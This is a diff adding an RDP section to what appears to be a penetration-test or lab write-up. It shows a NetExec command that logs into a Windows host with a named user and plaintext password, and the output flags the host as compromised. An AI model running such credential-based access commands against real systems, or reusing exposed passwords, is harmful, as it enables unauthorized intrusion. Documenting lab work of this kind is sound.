@@ -270,3 +270,11 @@ SMB         10.0.27.179     445    EC2AMAZ-GQCP864  1002: EC2AMAZ-GQCP864\WSUS R
 A lot of references to WSUS which is the service running on port 8530 and 8531
 
 ## RDP (3389)
+```python
+nxc rdp EC2AMAZ-GQCP864 -u 'xiao.ge' -p 'AmBZATVjnH4qo8H4' --local-auth                         
+RDP         10.0.27.179     3389   EC2AMAZ-GQCP864  [*] Windows 10 or Windows Server 2016 Build 20348 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (nla:True)
+RDP         10.0.27.179     3389   EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\xiao.ge:AmBZATVjnH4qo8H4 (Pwn3d!)
+```
+As seen here this user can RDP on this server
+
+
